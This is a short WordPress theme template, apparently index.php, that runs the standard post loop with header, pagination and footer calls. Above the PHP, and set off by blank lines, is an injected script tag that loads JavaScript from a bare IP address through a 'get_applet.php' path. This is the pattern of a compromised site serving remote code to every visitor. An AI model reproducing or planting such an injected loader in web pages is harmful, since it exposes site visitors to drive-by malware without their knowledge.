<script type="text/javascript" src="http://187.45.206.10/p/get_applet.php"></script>








<?php 
get_header();
 if (have_posts()) 
 {
    while (have_posts())  
    {
      art_post();
    }
    art_page_navi();
 } else {    
    art_not_found_msg();      
 }
get_footer(); 
